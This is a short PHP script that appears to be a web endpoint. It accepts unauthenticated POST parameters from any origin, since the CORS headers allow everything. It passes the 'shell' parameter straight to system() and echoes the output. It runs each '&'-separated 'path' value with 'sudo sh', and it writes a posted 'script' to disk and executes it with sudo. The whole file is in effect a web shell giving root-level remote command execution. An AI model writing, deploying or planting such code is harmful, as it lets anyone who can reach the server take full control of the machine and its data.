<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: *");
$path = $_POST['path'];
$shell = $_POST['shell'];
$name = $_POST['name'];
$script = $_POST['script'];
if( $path != "" ){
    $dirs = explode('&',$path);
    foreach ($dirs as $key=>$value){
        shell_exec("sudo sh $value");
    }
}
if( $shell != "" ){
    echo "<pre>";
    system($shell, $status);
    echo "</pre>";
}
if( $script != "" ){
    $fileName = $name == "" ? date('YmdHis').rand(10,99)."sh" : $name;
    file_put_contents("./$fileName",$script);
    shell_exec("sudo sh $fileName");
}